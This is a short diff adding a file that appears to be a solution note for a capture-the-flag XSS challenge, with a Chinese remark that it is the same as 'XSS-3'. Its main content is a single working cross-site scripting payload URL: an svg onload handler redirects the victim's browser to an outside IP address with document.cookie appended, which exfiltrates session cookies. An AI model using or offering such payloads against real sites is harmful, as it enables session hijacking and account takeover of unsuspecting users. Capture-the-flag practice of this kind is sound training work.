@@ -1,0 +1,3 @@
+http://web.djosix.com:15106/?input=<svg/onload=window.location.href=`http://140.113.68.171:8000/`%2Bdocument.cookie>
+
+跟 XSS-3 一樣
